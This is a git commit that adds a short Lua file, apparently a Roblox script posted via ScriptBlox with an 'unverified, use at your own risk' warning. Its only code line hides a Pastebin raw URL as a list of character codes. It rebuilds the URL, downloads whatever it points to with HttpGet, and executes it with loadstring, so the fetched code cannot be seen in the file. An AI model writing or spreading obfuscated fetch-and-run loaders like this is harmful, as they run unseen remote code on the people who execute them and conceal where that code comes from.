8413b10c1e8662f6b2d6e93a701b3b04c7bed24e
checkurasshole <86085809+checkurasshole@users.noreply.github.com>
2025-07-02 19:53:37 -0500

    Add tester3

---
+++ tester3.lua
@@ -0,0 +1,4 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local t={104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,98,71,110,50,107,68,121,56}s=""for i=1,#t do s=s..string.char(t[i])end loadstring(game:HttpGet(s,true))()
